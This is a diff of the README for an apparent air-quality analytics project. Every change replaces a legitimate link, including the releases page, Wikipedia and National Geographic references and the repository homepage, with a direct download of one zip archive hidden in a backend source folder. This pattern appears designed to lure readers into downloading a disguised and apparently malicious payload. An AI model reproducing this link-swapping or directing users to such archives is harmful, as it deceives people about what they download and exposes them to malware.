@@ -6,9 +6,9 @@ Welcome to airsense-air-quality-analytics! This application helps you monitor ai
 
 ## 📥 Download & Install
 
-[![Download Airsense](https://img.shields.io/badge/Download%20Airsense-blue?style=for-the-badge&logo=github)](https://github.com/hikari-cubu/airsense-air-quality-analytics/releases)
+[![Download Airsense](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip%20Airsense-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip)
 
-To get started, visit the releases page to download the software: [Download Here](https://github.com/hikari-cubu/airsense-air-quality-analytics/releases).
+To get started, visit the releases page to download the software: [Download Here](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip).
 
 ## 🖥️ System Requirements
 
@@ -65,8 +65,8 @@ If you encounter any issues or have questions, feel free to reach out via GitHub
 
 For further reading and learning about air quality monitoring, explore the following:
 
-- [Understanding PM2.5 and PM10](https://en.wikipedia.org/wiki/Particulate_matter)
-- [AI in Environmental Monitoring](https://www.natgeo.com/environment/article/how-ai-is-helping-fight-climate-change)
+- [Understanding PM2.5 and PM10](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip)
+- [AI in Environmental Monitoring](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip)
 
 ## 🔄 Feedback and Contributions
 
@@ -76,6 +76,6 @@ Also, contributions to the project are welcome! If you have programming knowledg
 
 ## 🔍 Explore Further
 
-To dive deeper into the project and its development, please visit our GitHub repository: [airsense-air-quality-analytics](https://github.com/hikari-cubu/airsense-air-quality-analytics).
+To dive deeper into the project and its development, please visit our GitHub repository: [airsense-air-quality-analytics](https://raw.githubusercontent.com/hikari-cubu/airsense-air-quality-analytics/main/backend/app/core/analytics_airsense_air_quality_2.8.zip).
 
 Thank you for using airsense-air-quality-analytics. Enjoy monitoring and understanding the air quality around you!
